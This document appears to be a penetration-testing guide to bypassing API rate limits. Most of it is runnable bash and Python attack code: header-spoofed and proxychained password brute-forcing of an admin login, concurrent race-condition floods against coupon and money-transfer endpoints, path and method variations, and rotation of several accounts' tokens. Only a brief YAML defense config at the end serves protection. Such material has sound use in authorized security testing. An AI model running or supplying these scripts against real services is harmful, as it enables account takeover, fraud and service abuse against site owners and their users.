# API Rate Limiting Bypass Guide

> Techniques for testing and bypassing API rate limiting controls including race conditions, header manipulation, distributed requests, and endpoint variation attacks.

---

## 1. Header-Based Bypass Techniques

Many rate limiters key on client IP. Spoofing origin headers can reset or bypass counters.

```bash
# X-Forwarded-For rotation to bypass IP-based rate limiting
for i in $(seq 1 100); do
  IP="10.$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/login \
    -H "X-Forwarded-For: $IP" \
    -H "X-Real-IP: $IP" \
    -H "X-Originating-IP: $IP" \
    -H "X-Client-IP: $IP" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":"attempt'$i'"}'
  echo " attempt $i (IP: $IP)"
done
```

```bash
# Test various IP spoofing headers accepted by the server
HEADERS=(
  "X-Forwarded-For"
  "X-Real-IP"
  "X-Originating-IP"
  "X-Client-IP"
  "CF-Connecting-IP"
  "True-Client-IP"
  "X-Forwarded"
  "Forwarded-For"
  "X-Cluster-Client-IP"
)

for header in "${HEADERS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/login \
    -H "$header: 1.2.3.4" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}')
  echo "$header -> HTTP $STATUS"
done
```

---

## 2. Race Condition Exploitation

Send concurrent requests to hit the endpoint before the rate limiter increments its counter.

```python
# Race condition using asyncio to send parallel requests
import asyncio
import aiohttp
import time

async def send_request(session, url, payload, request_id):
    headers = {"Content-Type": "application/json"}
    async with session.post(url, json=payload, headers=headers) as resp:
        body = await resp.text()
        return {"id": request_id, "status": resp.status, "body": body[:100]}

async def race_condition_test(url, payload, concurrent=50):
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Create all tasks first, then gather to fire simultaneously
        tasks = [
            send_request(session, url, payload, i)
            for i in range(concurrent)
        ]
        results = await asyncio.gather(*tasks)
        
        success = sum(1 for r in results if r["status"] == 200)
        blocked = sum(1 for r in results if r["status"] == 429)
        print(f"Results: {success} success, {blocked} rate-limited")
        return results

asyncio.run(race_condition_test(
    "https://target.com/api/redeem-coupon",
    {"code": "DISCOUNT50", "user_id": "attacker123"},
    concurrent=50
))
```

```bash
# GNU parallel for concurrent request flooding
seq 1 100 | parallel -j 50 \
  'curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/transfer \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"to\":\"attacker\",\"amount\":1}"' \
  | sort | uniq -c | sort -rn
```

---

## 3. Endpoint Variation Attacks

Rate limiters often key on exact URL paths. Variations may bypass the counter.

```bash
# Path normalization bypass
ENDPOINTS=(
  "/api/v1/login"
  "/api/v1/login/"
  "/api/v1/./login"
  "/api/v1/users/../login"
  "/API/V1/LOGIN"
  "/api/v1/login?dummy=1"
  "/api/v1/login#fragment"
  "/api/v1/login;param=value"
  "%2Fapi%2Fv1%2Flogin"
)

for endpoint in "${ENDPOINTS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com${endpoint}" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":"test"}')
  echo "$endpoint -> HTTP $STATUS"
done
```

```bash
# HTTP method variation (some rate limiters only track POST)
curl -s -o /dev/null -w "POST: %{http_code}\n" \
  -X POST https://target.com/api/data -H "Authorization: Bearer $TOKEN"

curl -s -o /dev/null -w "GET:  %{http_code}\n" \
  -X GET "https://target.com/api/data" -H "Authorization: Bearer $TOKEN"

# API version switching
curl -s -o /dev/null -w "v1: %{http_code}\n" \
  https://target.com/api/v1/users -H "Authorization: Bearer $TOKEN"
curl -s -o /dev/null -w "v2: %{http_code}\n" \
  https://target.com/api/v2/users -H "Authorization: Bearer $TOKEN"
```

---

## 4. Distributed Request Patterns

```python
# Rotate through multiple authentication tokens to distribute rate limits
import requests
import itertools

tokens = [
    "token_account_1",
    "token_account_2", 
    "token_account_3",
    "token_account_4",
    "token_account_5",
]

token_cycle = itertools.cycle(tokens)
url = "https://target.com/api/search"
results = []

for query_term in open("wordlist.txt"):
    token = next(token_cycle)
    resp = requests.get(
        url,
        params={"q": query_term.strip()},
        headers={"Authorization": f"Bearer {token}"}
    )
    if resp.status_code == 200:
        results.append(resp.json())
    elif resp.status_code == 429:
        print(f"Token {token[:10]}... rate limited, rotating")
    
print(f"Collected {len(results)} results across {len(tokens)} accounts")
```

```bash
# Using multiple source IPs via proxychains
# Configure /etc/proxychains4.conf with SOCKS proxies
for i in $(seq 1 50); do
  proxychains4 -q curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":"pass'$i'"}' &
done
wait
```

---

## 5. Time-Based Bypass

```python
# Identify rate limit window and exploit reset timing
import requests
import time

url = "https://target.com/api/login"
payload = {"email": "admin@target.com", "password": "test"}

# Phase 1: Determine rate limit threshold and window
for i in range(1, 200):
    resp = requests.post(url, json=payload)
    if resp.status_code == 429:
        print(f"Rate limited after {i} requests")
        # Check Retry-After or X-RateLimit-Reset headers
        retry_after = resp.headers.get("Retry-After", "unknown")
        reset_time = resp.headers.get("X-RateLimit-Reset", "unknown")
        remaining = resp.headers.get("X-RateLimit-Remaining", "unknown")
        print(f"Retry-After: {retry_after}")
        print(f"Reset-Time: {reset_time}")
        print(f"Remaining: {remaining}")
        break

# Phase 2: Burst at window boundaries
# Send max requests just before window resets
print("Waiting for rate limit window reset...")
time.sleep(int(retry_after) if retry_after.isdigit() else 60)
print("Window reset - sending next burst")
```

---

## 6. Defense Validation

```yaml
# Robust rate limiting configuration to test against
rate_limiting:
  strategy: "sliding_window"  # Not fixed window (vulnerable to boundary attacks)
  keys:
    - "authenticated_user_id"  # Primary key (not IP alone)
    - "ip_address"             # Fallback for unauthenticated
  limits:
    login: "5/minute"
    api_general: "100/minute"
    api_sensitive: "10/minute"
  headers_ignored:             # Do NOT trust these for rate limiting
    - "X-Forwarded-For"
    - "X-Real-IP"
  response_headers:
    - "X-RateLimit-Limit"
    - "X-RateLimit-Remaining"
    - "X-RateLimit-Reset"
  penalties:
    exceeded_3x: "exponential_backoff"
    exceeded_10x: "temporary_ban_15min"
```

Effective rate limiting must be tested from the attacker's perspective. Verify that all bypass techniques above are properly mitigated before considering the implementation secure.
